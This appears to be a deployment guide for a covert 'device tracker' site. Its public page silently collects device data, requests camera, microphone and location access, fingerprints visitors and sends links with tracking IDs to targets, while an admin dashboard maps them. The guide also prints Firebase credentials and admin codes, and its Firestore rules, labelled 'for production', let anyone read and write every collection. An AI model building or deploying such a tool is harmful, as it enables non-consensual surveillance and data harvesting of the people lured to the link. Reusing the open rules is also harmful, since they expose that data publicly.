# Device Tracker - Deployment Guide

## PROJECT STRUCTURE

```
device-tracker/
├── src/
│   ├── components/
│   ├── pages/
│   │   ├── TrackingPage.tsx       (Public page - collects data)
│   │   ├── AdminLogin.tsx         (Admin login with secret code)
│   │   └── AdminDashboard.tsx     (View all visitor data)
│   ├── lib/
│   │   ├── firebase.ts            (Firebase config)
│   │   └── deviceCollector.ts     (60 features collection)
│   ├── types/
│   │   └── index.ts               (TypeScript types)
│   ├── App.tsx
│   └── main.tsx
├── public/
├── index.html
├── package.json
├── vite.config.ts
└── tsconfig.json
```

---

## SECRET CODES

### Signup Code: `DEVICE2024`
- Required to create new admin account
- Wrong code = 1 hour IP block

### Forget Password Code: `FORGET2024`
- Required to reset password
- Works with email to set new password

---

## DEPLOYMENT ON VERCEL

### Method 1: GitHub + Vercel (Recommended)

#### Step 1: Create GitHub Repository

1. Open: https://github.com/new
2. Repository name: `device-tracker`
3. Select: **Private** (recommended)
4. Click: **Create repository**

#### Step 2: Upload Project to GitHub

**Option A: Using GitHub Website (No commands)**

1. Go to your repository page
2. Click "Add file" → "Upload files"
3. Drag & drop all project files:
   - src folder
   - public folder
   - index.html
   - package.json
   - vite.config.ts
   - tsconfig.json
   - tsconfig.node.json
4. Commit message: "Initial upload"
5. Click "Commit changes"

**Option B: Using Git Commands**

```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/device-tracker.git
git push -u origin main
```

#### Step 3: Deploy on Vercel

1. Open: https://vercel.com
2. Click "Sign Up" (use GitHub)
3. Authorize Vercel to access GitHub
4. Click "Add New..." → "Project"
5. Import your `device-tracker` repository
6. Framework Preset: **Vite**
7. Build Command: `npm run build`
8. Output Directory: `dist`
9. Click "Deploy"

#### Step 4: Get Live URL

Your site will be live at:
```
https://device-tracker.vercel.app           (Public site)
https://device-tracker.vercel.app/admin     (Admin panel)
```

---

### Method 2: Vercel CLI (No GitHub)

#### Step 1: Install Vercel CLI

```bash
npm install -g vercel
```

#### Step 2: Deploy

```bash
vercel
```

Follow prompts:
- Link to existing project? **No**
- Project name: **device-tracker**
- Directory: **./**

---

## FIREBASE SETUP

### Step 1: Create Firestore Database

1. Open: https://console.firebase.google.com
2. Select project: `visit-and-get`
3. Go to: **Firestore Database**
4. Click: **Create database**
5. Start in: **Test mode** (for development)
6. Region: Select nearest to you
7. Click: **Enable**

### Step 2: Create Collections

The app will auto-create these collections:
- `visitors` - stores all visitor data
- `admin_users` - stores admin accounts
- `blocked_ips` - stores blocked IPs

### Step 3: Security Rules (Optional)

For production, update Firebase rules:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /visitors/{visitor} {
      allow read, write: if true;
    }
    match /admin_users/{user} {
      allow read, write: if true;
    }
    match /blocked_ips/{ip} {
      allow read, write: if true;
    }
  }
}
```

---

## LOCAL DEVELOPMENT

### Run locally:

```bash
npm install
npm run dev
```

Open: http://localhost:5173

Admin panel: http://localhost:5173/admin

---

## FEATURES

### Public Page (Tracking)

When a visitor opens the site:
1. 30 silent features collected automatically
2. 30 permission features requested
3. Data saved to Firebase
4. Unique device fingerprint generated

### Admin Panel

Access: `/admin`

1. **Secret Code Entry**
   - Code: `DEVICE2024`
   - Wrong code = IP blocked 1 hour

2. **Signup** (First time)
   - Email + Password
   - One device = One account

3. **Login**
   - Email + Password

4. **Forget Password**
   - Email + Forget Code (`FORGET2024`)
   - Automatic password reset

5. **Dashboard**
   - View all visitors
   - Search by ID/IP
   - View all 60 features
   - Delete visitors
   - Location on map

---

## API ENDPOINTS

| Route | Description |
|-------|-------------|
| `/` | Public tracking page |
| `/admin` | Admin login/signup |

---

## ENVIRONMENT VARIABLES

The Firebase config is hardcoded in `src/lib/firebase.ts`.
For production, you can use environment variables:

```env
VITE_FIREBASE_API_KEY=AIzaSyDwd_0HgLDHF2vsQnWhn8ItBd20xt7ZbC4
VITE_FIREBASE_AUTH_DOMAIN=visit-and-get.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=visit-and-get
VITE_FIREBASE_STORAGE_BUCKET=visit-and-get.firebasestorage.app
VITE_FIREBASE_MESSAGING_SENDER_ID=249322078960
VITE_FIREBASE_APP_ID=1:249322078960:web:16b3da146159ff30a93835
```

Then update `src/lib/firebase.ts` to use `import.meta.env.VITE_FIREBASE_API_KEY` etc.

---

## SECURITY NOTES

1. **IP Blocking**: Wrong secret code blocks IP for 1 hour
2. **Device Fingerprint**: Unique hash prevents multiple accounts
3. **Firebase Security**: Enable proper rules for production
4. **HTTPS Required**: Camera/microphone needs HTTPS

---

## TROUBLESHOOTING

### Camera/Microphone not working
- Must be HTTPS (localhost or vercel.app)
- Browser permissions required

### Firebase errors
- Check Firebase console
- Ensure Firestore is enabled
- Check security rules

### IP blocking not working
- Uses external IP API
- Falls back to 'unknown'

---

## COST

- **Firebase**: FREE (1GB storage)
- **Vercel**: FREE (100GB bandwidth)
- **GitHub**: FREE (public repos)

Total: **$0/month**

---

## NEXT STEPS

1. Upload to GitHub
2. Deploy to Vercel
3. Test functionality
4. Enable Firebase rules for production
5. Share tracking link: `https://your-site.vercel.app/?id=CUSTOM_ID`

---

Created: 2026
